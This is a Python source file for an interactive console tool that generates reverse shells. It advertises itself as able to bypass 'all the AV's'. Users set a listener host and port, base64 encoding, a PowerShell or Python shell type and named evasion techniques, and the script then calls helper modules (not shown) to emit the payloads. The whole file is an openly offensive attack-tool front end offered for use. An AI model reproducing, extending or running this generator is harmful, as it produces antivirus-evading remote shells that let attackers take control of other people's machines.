import mcreatorlib, mcreatorshells, mcreatortechniques
import socket, subprocess, argparse
from sys import argv, exit

__AUTHOR__ = "@blacknbunny"

parser = argparse.ArgumentParser(description="Reverse Shell & Injector generator with techniques to bypass all the AV's")
parser.add_argument('-rsg', '--rsgenerator', help='Reverse Shell Generator With Encryptions & Techniques You Add Or Pick')
args = parser.parse_args()

if not len(argv) > 1:
    parser.print_help()
    exit(1)

class ReverseShellGenerator:
    def set_technique(self, creator, technique, lhost, lport):
        egg = 0
        if technique == "0":
            mcreatortechniques.zerotechnique()
        elif technique == "":
            mcreatortechniques.zerotechnique()
        elif technique == "show techniques":
            mcreatorlib.techniques()
        elif technique == "1":
            print("\nTechnique = strstr\n")
            mcreatorlib.technique = "strstr"
            mcreatortechniques.strstr(lhost, lport)
        elif technique == "2":
            print("\nTechnique = toomuchmem\n")
            mcreatorlib.technique = "toomuchmem"
            mcreatortechniques.toomuchmem(lhost, lport)
        elif technique == "3":
            print("\nTechnique = increment\n")
            mcreatorlib.technique = "increment"
            mcreatortechniques.increment(lhost, lport)
        else:
            mcreatortechniques.zerotechnique()
        
    def set_lhost(self, creator):
        err = 0
        mcreatorlib.lhost = creator[10:]
        try:
            socket.inet_aton(mcreatorlib.lhost)
        except socket.error:
            err = 1
            print("[!] Not A Valid IP Address : " + mcreatorlib.lhost )
        if err != 1:
            print("\nLHOST = " + mcreatorlib.lhost + "\n")


    def set_lport(self, creator):
        mcreatorlib.lport = int(creator[10:])
        if type(mcreatorlib.lport) == int:
            print("\nLPORT = " + str(mcreatorlib.lport) + "\n")
        else:
            print("\n[!] Not A Valid Port : " + str(mcreatorlib.lport) + "\n" )

    def set_encode(self, creator):
        mcreatorlib.encode_type = creator[11:]
        if mcreatorlib.encode_type == "base64":
            print("\nEncode Type = " + mcreatorlib.encode_type + "\n")
        else:
            print("\nshow encode_types\n")

    def set_reverse_shell(self, creator):
        if creator[18:] == "powershell":
            mcreatorlib.reverse_shell = "powershell"
            print("\nreverse_shell = powershell\n")
        elif creator[18:] == "python":
            mcreatorlib.reverse_shell = "python"
            print("\nreverse_shell = python\n")
        else:
            print("\nshow reverse_shells\n")

    def run(self, lhost, lport, reverse_shell):
        if lhost == "":
            print("\n[!] Wrong LHOST, LPORT or encode_type. Can't run please start script again. [!]\n")
            exit(1)
        if reverse_shell == "powershell":
            mcreatorshells.powershell(lhost, lport)
        if reverse_shell == "python":
            mcreatorshells.python(lhost, lport)


    def allinone(self):
        count = 0
        reverse_shell = ""
        lhost = ""
        lport = 4444
        encode_type = ""

        while count == 0:
            creator = raw_input("creator > ")
            
            if creator.startswith("set"):
                if creator[4:17] == "reverse_shell":
                    if creator[18:] == "powershell":
                        print("")
                        technique = raw_input("Technique (show techniques) : ")
                        set_technique = self.set_technique(creator, technique, lhost, lport)
                    else:
                        self.set_reverse_shell(creator)
                        reverse_shell = mcreatorlib.reverse_shell
                elif creator[4:9] == "LHOST":
                    self.set_lhost(creator)
                    lhost = mcreatorlib.lhost
                elif creator[4:9] == "LPORT":
                    self.set_lport(creator)
                    lport = mcreatorlib.lport
                elif creator[4:10] == "encode":
                    self.set_encode(creator)
                    encode_type = mcreatorlib.encode_type
                else:
                    print("\n[!] Unknown set option\n")
            elif creator == "show reverse_shells":
                mcreatorlib.reverse_shells()
            elif creator == "show techniques":
                mcreatorlib.techniques()
            elif creator == "show encode_types":
                mcreatorlib.encode_types()
            elif creator == "run":
                self.run(lhost, lport, reverse_shell)
                if mcreatorlib.technique != "":
                   mcreatortechniques.printtechnique(mcreatorlib.technique)
                   mcreatorlib.technique = ""
            elif creator == "show help":
                mcreatorlib.help()
            elif creator == "exit":
                mcreatorlib.exit()
                count = 1
            else:
                print("\nCommand for help: show help\n")
def main():
    try:
        if args.rsgenerator == "console":
            rsgenerator = ReverseShellGenerator()
            rsgenerator.allinone()
    except Exception as e:
        print(e)
        parser.print_help()
        exit(1)

if __name__ == '__main__':
    try:
        exit(main())
    except KeyboardInterrupt as e:
        print("C^")
